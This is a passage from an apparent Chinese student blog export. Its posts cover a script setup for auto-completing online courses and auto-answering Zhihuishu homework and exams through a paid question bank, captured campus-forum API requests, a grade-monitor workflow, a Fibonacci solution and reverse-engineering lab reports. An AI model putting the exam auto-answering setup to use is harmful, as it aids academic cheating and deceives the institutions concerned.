<p>然后点击智慧树知到（如果是刷学习通的话点学习通，这里不过多赘述）</p>
<p>然后登录上自己的账号（其实不登录也行，主要是要配置题库）</p>
<p>找到下面这个东西</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/ocs/4.jpg"
                      alt="ocs 配置"
                ></p>
<p>点击通用，点击全局设置</p>
<p>根据自己需要进行下面配置</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/ocs/5.jpg"
                      alt="题库配置"
                ></p>
<p><a class="link"   href="https://tk.enncy.cn/" >点击进入题库管理平台<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h2 id="ocs-题库设置"><a href="#ocs-题库设置" class="headerlink" title="ocs 题库设置"></a>ocs 题库设置</h2><h3 id="第一步：注册题库账号"><a href="#第一步：注册题库账号" class="headerlink" title="第一步：注册题库账号"></a>第一步：注册题库账号</h3><p>右上角注册，具体这个就不说了，只能用邮箱注册，之前用爱发电登录的请使用其他登录 <code>爱发电授权登录</code> 。</p>
<h3 id="第二步：登录题库，复制题库凭证"><a href="#第二步：登录题库，复制题库凭证" class="headerlink" title="第二步：登录题库，复制题库凭证"></a>第二步：登录题库，复制题库凭证</h3><p>登录后将会自动跳转到个人中心，每个人新注册账号可以获得 100 次免费搜题次数，找到 <strong>题库配置</strong> , 最后点击复制。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://tk.enncy.cn/image/details.png"
                      alt="login"
                ></p>
<h3 id="第三步：配置脚本题库"><a href="#第三步：配置脚本题库" class="headerlink" title="第三步：配置脚本题库"></a>第三步：配置脚本题库</h3><p>在浏览器中打开你的网课， 进入学习，作业，考试页面，然后按照以下步骤配置：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://tk.enncy.cn/image/new-tkpz.png"
                      alt="login"
                ></p>
<h3 id="最后一步：刷新页面"><a href="#最后一步：刷新页面" class="headerlink" title="最后一步：刷新页面"></a>最后一步：刷新页面</h3><p>等待运行到自动答题章节后，查看搜题结果，如果搜索到了则为配置成功！</p>
<h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><ul>
<li>如果次数使用完毕，进入个人中心购买次数即可</li>
<li>收费项目归平台所有，与本人无关，酌情选择</li>
<li>平台收费价格为 1 元&#x2F;100 次，3 元&#x2F;2000 次，10 元&#x2F;10000 次，50 元&#x2F;十万次</li>
</ul>
<h2 id="刷课配置"><a href="#刷课配置" class="headerlink" title="刷课配置"></a>刷课配置</h2><p>由于智慧树知到有习惯分，脚本提供了习惯刷课功能</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/ocs/7.jpg"
                      alt="习惯分"
                ></p>
<p>点击右上角 <strong>知到智慧树</strong>，点击 <strong>学习脚本</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/ocs/8.jpg"
                      alt="习惯分"
                ></p>
<p>根据喜好进行刷课即可，建议每天半小时，有习惯分</p>
<h1 id="展示"><a href="#展示" class="headerlink" title="展示"></a>展示</h1><p>由于我这学期没有智慧树平台的相关课程，各位自己偷偷刷吧</p>
<h1 id="用户协议"><a href="#用户协议" class="headerlink" title="用户协议"></a>用户协议</h1><ol>
<li>使用本教程即代表同意此用户协议</li>
<li>使用本教程所带来的后果均由用户个人承担</li>
<li>本教程所涉及的消费均与本人无关</li>
<li>本教程未经本人允许禁止转载</li>
<li>不要跟我杠，杠就是你对</li>
<li>我本人有 <strong>抑郁症</strong> 病史，玩过小红书，若本人遭受任何形式的网络暴力 (包括但不限于发送淫 &#x2F; 秽血 &#x2F; 腥图片，问候我家人), 并出现极端行为。一切都是 <strong>本人的错</strong> 和大家无关</li>
<li>本教程旨在节省大家时间，让大家去做更有意义的事情，请勿用于违法用途，请勿倒卖，否则将追究法律责任</li>
<li><font color='blue'> 博主 W1ndys 享有最终解释权 </font></li>
</ol>
]]></content>
      <categories>
        <category>技术教程</category>
      </categories>
      <tags>
        <tag>智慧树知到</tag>
        <tag>刷课脚本</tag>
      </tags>
  </entry>
  <entry>
    <title>曲师大在校生论坛抓包分析</title>
    <url>/posts/7c3c27d6.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在校生论坛，野生平台，爬着玩玩<br>推荐阅读：【微信小程序Burp+Proxifter抓包详细教程 - CSDN App】<a class="link"   href="https://blog.csdn.net/CKT_GOD/article/details/134076065?sharetype=blog&shareId=134076065&sharerefer=APP&sharesource=m0_73731989&sharefrom=link" >https://blog.csdn.net/CKT_GOD/article/details/134076065?sharetype=blog&amp;shareId=134076065&amp;sharerefer=APP&amp;sharesource=m0_73731989&amp;sharefrom=link<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h3 id="请求包示例"><a href="#请求包示例" class="headerlink" title="请求包示例"></a>请求包示例</h3><p>获取帖子详情</p>
<div class="code-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/api/client/topics/1906634</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>api.zxs-bbs.cn</span><br><span class="line">Xweb_xhr: 1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x63090c11)XWEB/11581</span><br><span class="line"><span class="attribute">Authorization</span><span class="punctuation">: </span>Bearer ********************</span><br><span class="line"><span class="attribute">Tenant</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>cross-site</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>cors</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>empty</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>https://servicewechat.com/wx866b5984d70bdf22/61/page-frame.html</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br></pre></td></tr></table></figure></div>

<p>获取帖子评论</p>
<div class="code-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/api/client/comments?topic_id=3106970&amp;sort=hot&amp;page=1</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>api.zxs-bbs.cn</span><br><span class="line">Xweb_xhr: 1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x63090c11)XWEB/11581</span><br><span class="line"><span class="attribute">Authorization</span><span class="punctuation">: </span>Bearer ********************</span><br><span class="line"><span class="attribute">Tenant</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>cross-site</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>cors</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>empty</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>https://servicewechat.com/wx866b5984d70bdf22/61/page-frame.html</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br></pre></td></tr></table></figure></div>

<p>获取十大热帖</p>
<div class="code-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/api/client/topics/top?school=QFNU</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>api.zxs-bbs.cn</span><br><span class="line">Xweb_xhr: 1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x63090c11)XWEB/11581</span><br><span class="line"><span class="attribute">Authorization</span><span class="punctuation">: </span>Bearer ********************</span><br><span class="line"><span class="attribute">Tenant</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>cross-site</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>cors</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>empty</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>https://servicewechat.com/wx866b5984d70bdf22/61/page-frame.html</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br></pre></td></tr></table></figure></div>
]]></content>
      <categories>
        <category>QFNU</category>
        <category>在校生论坛</category>
      </categories>
      <tags>
        <tag>QFNU</tag>
        <tag>在校生论坛</tag>
        <tag>抓包</tag>
        <tag>分析</tag>
      </tags>
  </entry>
  <entry>
    <title>曲阜师范大学教务系统成绩监控（无需服务器）</title>
    <url>/posts/4fee17c4.html</url>
    <content><![CDATA[<h2 id="曲阜师范大学教务系统成绩监控"><a href="#曲阜师范大学教务系统成绩监控" class="headerlink" title="曲阜师范大学教务系统成绩监控"></a>曲阜师范大学教务系统成绩监控</h2><h4 id="点击链接加入群聊【Easy-QFNU-｜-曲师大选课指北群】：https-qm-qq-com-q-xDrtQHMDNm"><a href="#点击链接加入群聊【Easy-QFNU-｜-曲师大选课指北群】：https-qm-qq-com-q-xDrtQHMDNm" class="headerlink" title="点击链接加入群聊【Easy-QFNU ｜ 曲师大选课指北群】：https://qm.qq.com/q/xDrtQHMDNm"></a>点击链接加入群聊【Easy-QFNU ｜ 曲师大选课指北群】：<a class="link"   href="https://qm.qq.com/q/xDrtQHMDNm" >https://qm.qq.com/q/xDrtQHMDNm<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></h4><h4 id="点击链接加入群聊【Easy-QFNU-｜-曲师大选课指北群-2】：https-qm-qq-com-q-Zw6GRHucim"><a href="#点击链接加入群聊【Easy-QFNU-｜-曲师大选课指北群-2】：https-qm-qq-com-q-Zw6GRHucim" class="headerlink" title="点击链接加入群聊【Easy-QFNU ｜ 曲师大选课指北群 2】：https://qm.qq.com/q/Zw6GRHucim"></a>点击链接加入群聊【Easy-QFNU ｜ 曲师大选课指北群 2】：<a class="link"   href="https://qm.qq.com/q/Zw6GRHucim" >https://qm.qq.com/q/Zw6GRHucim<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></h4><p>关注微信公众号获取更多内容</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://picx.zhimg.com/80/v2-a42b58d3c6fa27d3ebe03b7090a7cf63.jpeg"
                      alt="img"
                ></p>
<p>曲阜师范大学教务系统成绩监控，检测到新有成绩出来之后会上报，利用 Github action 运行，无需服务器</p>
<p>2025-01-17 更新了获取总学分总绩点，2024-2025-1 的学期绩点，依据学生手册的计算公式计算，精确到小数点后 15 位，先前版本如何更新： 点击 sync fork，再点击红色的按钮，自动初始化一次之后即可正常运行</p>
<h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pica.zhimg.com/80/v2-ab040cb6e2c97cd56de73d09777c4f07.png"
                      alt="效果"
                ></p>
<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><h3 id="fork-项目"><a href="#fork-项目" class="headerlink" title="fork 项目"></a>fork 项目</h3><p><a class="link"   href="https://github.com/W1ndys/QFNUScoreReminder" >W1ndys&#x2F;QFNUScoreReminder: 曲阜师范大学教务系统成绩监控，检测到新有成绩出来之后会上报<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>点击链接进入 Github，fork 本项目到自己的仓库</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pica.zhimg.com/80/v2-01a15518704c6c8af91cf05cd843c795.png"
                      alt="image-20250111173147175"
                ></p>
<h3 id="新增钉钉机器人"><a href="#新增钉钉机器人" class="headerlink" title="新增钉钉机器人"></a>新增钉钉机器人</h3><p>去钉钉新建一个自己的群，去群设置 &gt; 机器人，添加一个自定义 webhook 机器人</p>
<p>记录配置的 <code>webhook</code> 和 <code>secret</code>（不要泄露），如果你的 webhook 是 <code>https://oapi.dingtalk.com/robot/send?access_token=xxx</code> ，那么 <code>DD_BOT_TOKEN</code> 就是 <code>xxx</code>，<code>DD_BOT_SECRET</code> 就是 <code>secret</code>，下面要用</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pica.zhimg.com/80/v2-99e91c06e71ac28cbed199f9e4321896.png"
                      alt="image-20250111173550018"
                ></p>
<h3 id="新增飞书机器人（可选）"><a href="#新增飞书机器人（可选）" class="headerlink" title="新增飞书机器人（可选）"></a>新增飞书机器人（可选）</h3><p>访问飞书开放平台，创建一个自定义机器人。</p>
<p>记录配置的 webhook 和 secret（不要泄露）。</p>
<p>FEISHU_BOT_URL 就是 <a class="link"   href="https://open.feishu.cn/open-apis/bot/v2/hook/xxxxxxx" >https://open.feishu.cn/open-apis/bot/v2/hook/xxxxxxx<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>FEISHU_BOT_SECRET 就是验证关键词，自己自定义的</p>
<h3 id="配置环境变量"><a href="#配置环境变量" class="headerlink" title="配置环境变量"></a>配置环境变量</h3><p>进入设置配置环境变量</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pica.zhimg.com/80/v2-e24e61d04f7bfdde25ce104f2a016c5d.png"
                      alt="image-20250111173249952"
                ></p>
<p>分别配置 <code>DD_BOT_SECRET</code> 和 <code>DD_BOT_TOKEN</code> 、<code>USER_ACCOUNT</code> 和 <code>USER_PASSWORD</code> 环境变量</p>
<p><code>DD_BOT_TOKEN</code> 和 <code>DD_BOT_SECRET</code> 是钉钉机器人配置的 <code>webhook</code> 和 <code>secret</code></p>
<p><code>USER_ACCOUNT</code> 和 <code>USER_PASSWORD</code> 是教务系统账号密码</p>
<h3 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h3><p>进入 <code>Actions</code> 页面，点击 <code>I understand my workflows,go ahead and enable them</code> 按钮，然后点击左侧的 <code>disable</code> 按钮，再点击 <code>enable workflows</code> 按钮，然后点击 <code>Run workflow</code> 按钮，运行项目，如果配置正确，会收到钉钉消息</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pica.zhimg.com/80/v2-7c49b45057d28dec0b33b9b7b37bc108.png"
                      alt="image-20250111175039786"
                ></p>
<p>收到钉钉消息，说明配置成功并且初始化成功</p>
<p>到这里已经可以正常运行了，程序会每 5 分钟检查一次成绩，有新成绩会发送钉钉消息</p>
]]></content>
  </entry>
  <entry>
    <title>月落乌啼算钱（斐波那契数列）</title>
    <url>/posts/28e75b42.html</url>
    <content><![CDATA[<h1 id="月落乌啼算钱（斐波那契数列）"><a href="#月落乌啼算钱（斐波那契数列）" class="headerlink" title="月落乌啼算钱（斐波那契数列）"></a>月落乌啼算钱（斐波那契数列）</h1><h2 id="题目背景"><a href="#题目背景" class="headerlink" title="题目背景"></a>题目背景</h2><p>（本道题目木有隐藏歌曲……不用猜了……）</p>
<p>《爱与愁的故事第一弹· heartache》最终章。</p>
<p>吃完 pizza，月落乌啼知道超出自己的预算了。为了不在爱与愁大神面前献丑，只好还是硬着头皮去算钱……</p>
<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>算完钱后，月落乌啼想着：“你坑我！”于是当爱与愁大神问多少钱时，月落乌啼说了一堆乱码。爱与愁大神说：“算了算了，我只问第 $n$ 样菜价格多少？”月落乌啼写出了：</p>
<p>$$F_n&#x3D;\dfrac{\left(\frac{1+\sqrt{5}}{2}\right)^n-\left(\frac{1-\sqrt{5}}{2}\right)^n}{\sqrt{5}}$$</p>
<p>由于爱与愁大神学过编程，于是就用 $1$ 分钟的时间求出了 $F_n$ 的结果。月落乌啼为此大吃一惊。你能学学爱与愁大神求出 $F_n$ 的值吗？</p>
<h2 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h2><p>一行一个自然数 $n$。</p>
<h2 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h2><p>只有 $1$ 行一个实数 $F_n$，保留两位小数。</p>
<h2 id="样例-1"><a href="#样例-1" class="headerlink" title="样例 #1"></a>样例 #1</h2><h3 id="样例输入-1"><a href="#样例输入-1" class="headerlink" title="样例输入 #1"></a>样例输入 #1</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">6</span><br></pre></td></tr></table></figure></div>

<h3 id="样例输出-1"><a href="#样例输出-1" class="headerlink" title="样例输出 #1"></a>样例输出 #1</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">8.00</span><br></pre></td></tr></table></figure></div>

<h2 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h2><p>对于所有数据：$0 \leq n\leq 48$。</p>
<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>法一</p>
<div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line">n = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">g5 = <span class="number">5</span>**<span class="number">0.5</span></span><br><span class="line">fn = ((((<span class="number">1</span> + g5) / <span class="number">2</span>) ** n) - (((<span class="number">1</span> - g5) / <span class="number">2</span>) ** n)) / g5</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;%.2f&quot;</span> % fn)</span><br></pre></td></tr></table></figure></div>

<p>法二</p>
<p>由于题目给出提示了，斐波那契数列，直接写一个斐波那契数列就行了，实测也是这样的</p>
<h2 id="题解解释"><a href="#题解解释" class="headerlink" title="题解解释"></a>题解解释</h2><p>这段代码是用来计算斐波那契数列的第 n 个数字的近似值的。以下是代码的解释：</p>
<ol>
<li><p><code>n = int(input())</code>: 用户输入一个整数 n，表示要计算斐波那契数列的第 n 个数字。</p>
</li>
<li><p><code>g5 = 5**0.5</code>: 这里定义了一个变量 g5，它是 5 的平方根，用于后面的计算。</p>
</li>
<li><p><code>fn = ((((1 + g5) / 2) ** n) - (((1 - g5) / 2) ** n)) / g5</code>: 这行代码计算了斐波那契数列的第 n 个数字的近似值。它使用了黄金比例和斐波那契数列的性质来进行计算。表达式中的部分是斐波那契数列的通项公式。</p>
</li>
<li><p><code>print(&quot;%.2f&quot; % fn)</code>: 最后，使用 <code>print</code> 函数将计算得到的近似值打印出来。<code>&quot;%.2f&quot;</code> 的格式化字符串表示将浮点数 fn 格式化为小数点后两位的浮点数，并打印出来。</p>
</li>
</ol>
<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>小数保留几位的方法</p>
<div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;%.2f&quot;</span> % math)</span><br></pre></td></tr></table></figure></div>

<p>开根号的方法</p>
<div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line">a = b ** <span class="number">0.5</span></span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>Python</category>
        <category>蓝桥</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>蓝桥</tag>
        <tag>洛谷</tag>
      </tags>
  </entry>
  <entry>
    <title>本博客免责声明</title>
    <url>/posts/72e47f4f.html</url>
    <content><![CDATA[<p>在使用本教程前，请务必阅读并理解以下内容。使用本教程即代表您同意以下用户协议：</p>
<ol>
<li><strong>用户协议</strong>：使用本教程即表示您同意遵守本免责声明和用户协议。若您不同意此协议，请勿使用本教程提供的信息和指南。</li>
<li><strong>个人责任</strong>：本教程所提供的信息仅供参考，使用者需自行承担因使用产品A而产生的任何风险和后果。</li>
<li><strong>消费责任</strong>：使用本教程涉及的任何消费或购买行为与本人无关，用户需自行对其行为负责并承担相应风险。</li>
<li><strong>禁止转载</strong>：未经本人允许，严禁对本教程内容进行转载或再分发。任何未经授权的转载行为都将被视为侵权行为。</li>
<li><strong>结果不保证</strong>：本教程提供的建议和技巧并不能保证用户能够取得特定的结果或效果。实际使用中的成果可能因个人技能、环境差异或其他因素而有所不同。</li>
</ol>
<p>在使用本教程提供的信息前，请谨慎考虑个人能力和环境因素，并在必要时寻求专业建议。对于因使用本教程而产生的任何问题或损失，我们概不负责。</p>
]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title>本站浏览须知</title>
    <url>/posts/95d5a910.html</url>
    <content><![CDATA[<h1 id="📌-浏览须知"><a href="#📌-浏览须知" class="headerlink" title="📌 浏览须知"></a>📌 浏览须知</h1><blockquote>
<p>欢迎访问本站，为了确保良好的浏览体验，请您了解以下事项：</p>
</blockquote>
<ol>
<li>本站源站 IP 已迁移至阿里云服务器，大陆地区访问速度有保障。</li>
<li>推荐使用 PC 端&#x2F;Pad 端等大屏设备浏览，以获得最佳阅读体验。</li>
<li>本站所有文章均为原创，仅代表作者个人观点。</li>
<li>本站内容仅供学习交流，不得转载或用于任何商业用途。</li>
</ol>
<hr>
<h1 id="🔐-隐私政策"><a href="#🔐-隐私政策" class="headerlink" title="🔐 隐私政策"></a>🔐 隐私政策</h1><p>尊敬的用户：</p>
<p>感谢您访问我们的网站。我们非常重视您的隐私保护和个人信息安全。请在使用我们的服务之前仔细阅读本隐私政策。</p>
<h2 id="信息收集与使用"><a href="#信息收集与使用" class="headerlink" title="信息收集与使用"></a>信息收集与使用</h2><ul>
<li>我们可能会收集您的部分个人信息，包括但不限于：IP 地址、浏览器类型、操作系统、访问时间、访问页面等信息。</li>
<li>这些信息用于优化网站性能并提供更好的服务。</li>
<li>我们承诺不会将您的个人信息用于其他目的，也不会与任何第三方共享（除非经您授权或法律要求）。</li>
</ul>
<h2 id="Cookie-和数据分析"><a href="#Cookie-和数据分析" class="headerlink" title="Cookie 和数据分析"></a>Cookie 和数据分析</h2><ul>
<li>我们可能使用 Cookie 技术和第三方数据分析工具，收集和分析用户行为数据。</li>
<li>这些数据仅用于统计分析和用户体验改善，不会涉及个人身份信息。</li>
</ul>
<h2 id="网站内容"><a href="#网站内容" class="headerlink" title="网站内容"></a>网站内容</h2><ul>
<li>本站包含原创内容和搬运内容（已标注出处）。</li>
<li>原创内容保留版权所有权，禁止未经授权的转载或复制。</li>
<li>搬运内容已尽可能注明出处，并尊重原作者的版权。</li>
</ul>
<h2 id="51la-站点统计"><a href="#51la-站点统计" class="headerlink" title="51la 站点统计"></a>51la 站点统计</h2><ul>
<li>我们使用 51la 站点统计工具了解网站流量和访问情况。</li>
<li>您的访问数据将被匿名化处理，仅用于网站分析和优化。</li>
</ul>
<hr>
<h1 id="⚠️-免责声明"><a href="#⚠️-免责声明" class="headerlink" title="⚠️ 免责声明"></a>⚠️ 免责声明</h1><h2 id="网站加载速度"><a href="#网站加载速度" class="headerlink" title="网站加载速度"></a>网站加载速度</h2><p>虽然我们已迁移至阿里云服务器，但如果您仍遇到加载缓慢的情况，可能与您的网络环境有关。</p>
<h2 id="第三方链接"><a href="#第三方链接" class="headerlink" title="第三方链接"></a>第三方链接</h2><p>本站可能包含指向第三方网站的链接，这些链接仅供参考和方便访问，我们不对第三方网站的内容和隐私政策负责。</p>
<h2 id="免责条款修改"><a href="#免责条款修改" class="headerlink" title="免责条款修改"></a>免责条款修改</h2><p>我们保留隐私政策和免责声明的修改权利。任何修改将在网站上公布，并在生效前提前通知用户。您继续使用我们的服务将视为接受修改后的条款。</p>
<hr>
<p>请您在使用我们的服务前仔细阅读并理解本隐私政策和免责声明。如有任何疑问或建议，欢迎随时联系我们。</p>
]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title>汇编语言与逆向工程实验报告1</title>
    <url>/posts/1c1a1773.html</url>
    <content><![CDATA[<h1 id="汇编语言与逆向工程实验报告-1"><a href="#汇编语言与逆向工程实验报告-1" class="headerlink" title="汇编语言与逆向工程实验报告 1"></a>汇编语言与逆向工程实验报告 1</h1><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Reverse-project/1/1.png"
                      alt="1"
                ></p>
]]></content>
      <categories>
        <category>QFNU</category>
        <category>汇编语言与逆向工程</category>
        <category>实验报告</category>
      </categories>
      <tags>
        <tag>汇编语言</tag>
        <tag>逆向工程</tag>
        <tag>QFNU</tag>
      </tags>
  </entry>
  <entry>
    <title>汇编语言与逆向工程实验报告10</title>
    <url>/posts/3dcbe5b0.html</url>
    <content><![CDATA[<h2 id="搭建实验环境"><a href="#搭建实验环境" class="headerlink" title="搭建实验环境"></a>搭建实验环境</h2><p>安装 nasm 和 r2</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install nasm</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Reverse-project/10/image-20240519130939502.png"
                      alt="image-20240519130939502"
                ></p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/radareorg/radare2.git</span><br><span class="line"><span class="built_in">cd</span> radare2</span><br><span class="line">sys/install.sh</span><br></pre></td></tr></table></figure></div>

<h2 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Reverse-project/10/image-20240519131029272.png"
                      alt="image-20240519131029272"
                ></p>
<p>然后建立 zero.asm 文件。将编译好的程序输入</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Reverse-project/10/image-20240519131300628.png"
                      alt="image-20240519131300628"
                ></p>
<p>对文件进行编译</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Reverse-project/10/image-20240519131416557.png"
                      alt="image-20240519131416557"
                ></p>
<p>通过 r2 看到对应的汇编指令和二进制指令</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Reverse-project/10/image-20240519131704935.png"
                      alt="image-20240519131704935"
                ></p>
<p>新建一个 pack.asm 文件，对刚刚的程序进行加壳操作将二进制指令加密。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Reverse-project/10/image-20240519151332651.png"
                      alt="image-20240519151332651"
                ></p>
<p>新建 pack_zero.asm 文件对刚刚加壳的程序进行脱壳，得到原始二进制指令。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Reverse-project/10/image-20240519134630399.png"
                      alt="image-20240519134630399"
                ></p>
<p>对文件进行编译。输入.&#x2F;pack_zero 111 脱壳成功。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Reverse-project/10/image-20240519150942108.png"
                      alt="image-20240519150942108"
                ></p>
]]></content>
      <categories>
        <category>QFNU</category>
        <category>汇编语言与逆向工程</category>
        <category>实验报告</category>
      </categories>
      <tags>
        <tag>汇编语言</tag>
        <tag>逆向工程</tag>
        <tag>QFNU</tag>
      </tags>
  </entry>
  <entry>
    <title>汇编语言与逆向工程实验报告11</title>
    <url>/posts/4accd526.html</url>
    <content><![CDATA[<h2 id="查壳"><a href="#查壳" class="headerlink" title="查壳"></a>查壳</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Reverse-project/11/image-20240520205924221.png"
                      alt="image-20240520205924221"
